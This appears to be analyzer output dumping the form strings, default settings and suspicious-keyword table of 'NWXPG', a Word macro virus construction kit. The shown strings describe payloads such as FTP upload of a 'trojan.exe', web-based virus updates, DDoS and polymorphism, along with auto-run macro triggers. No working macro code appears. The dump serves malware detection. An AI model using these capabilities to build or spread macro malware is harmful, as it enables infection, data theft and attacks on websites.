-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Blackjack�L
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�SnakeByte�L
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�BSL4�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�$moothie�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ocker
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Fii7e
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�DrOwlFS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Raid"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�SerialKillerq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�LysKovick�L
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�zony�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Tru3sPiRiTL
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�T00fic@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Lifewire�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�SlageHammer
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ratter@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Benny
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�VirusBuster
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�CyberWarrior�

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�PhileT0a$t3r
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Dr.G0nzo�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/mainfrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/mainfrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Virusname�L
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/mainfrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/mainfrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Create@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/mainfrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/mainfrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Exit�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/mainfrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/mainfrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Payloadsg
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/mainfrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/mainfrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�About
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/mainfrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/payloads/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Upload Files to FTP
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/payloads/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/payloads/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Download Files from WWW
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/payloads/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/payloads/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ping Websites�N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/payloads/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/payloads/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Own pluginte
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/payloads/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/payloads/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Close
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/payloads/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/payloads/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Polymorphic
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/payloads/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/vck/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�After i've coded 2 versions of NTVCK, i decided to do something new.Like a VCK, that based on Internet tools:                    Examples are:                                                                                     -----------------------------------------------------------------------.                       - Upload files to FTPs                                                  .                       - Update your virus via WWW                                    .                       - DDOS Websites                                                         .                       - Self-mailing or Network compatiblities,etc                        -----------------------------------------------------------------------I found some interesting stuff and put it in.                                               Hope you like.                                                                                          Any questions,suggestions,bug-report,etc mail me!                                                 necronomikon@poczta.onet.pl
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/vck/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/about'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/about'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton3'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/about'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton4'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/about'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/about'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/frmPlugin'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/frmPlugin'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'MsgBox "Thanks WalruS for this piece of code...!;)", 48,"NWXPG"'
-------------------------------------------------------------------------------
VBA FORM Variable "b'back'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/frmPlugin'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'clear'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/frmPlugin'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/frmPlugin'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'user'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/ftp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'necronomikon'
-------------------------------------------------------------------------------
VBA FORM Variable "b'pass'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/ftp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'password'
-------------------------------------------------------------------------------
VBA FORM Variable "b'dir'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/ftp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'your-dir-here'
-------------------------------------------------------------------------------
VBA FORM Variable "b'file'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/ftp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'trojan.exe'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/ftp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/ftp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/ftp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/ftp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/ftp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ftp1'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/ftp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'ftp.necro.net'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/ftp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label6'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label7'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label8'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label9'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label10'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label11'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label12'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label13'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label14'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label15'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label16'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label17'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label18'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label19'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label20'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label21'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label22'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label23'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'tb1'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/mainfrm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label18'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/mainfrm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton3'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/mainfrm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton4'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/mainfrm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/mainfrm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton5'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/mainfrm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/mainfrm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'optftp'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/payloads'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'optwww'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/payloads'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'optping'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/payloads'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'optown'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/payloads'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/payloads'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'chkpoly'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/payloads'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/vck'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/vck'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |UserForm_Click      |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|AutoExec  |TextBox1_Change     |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
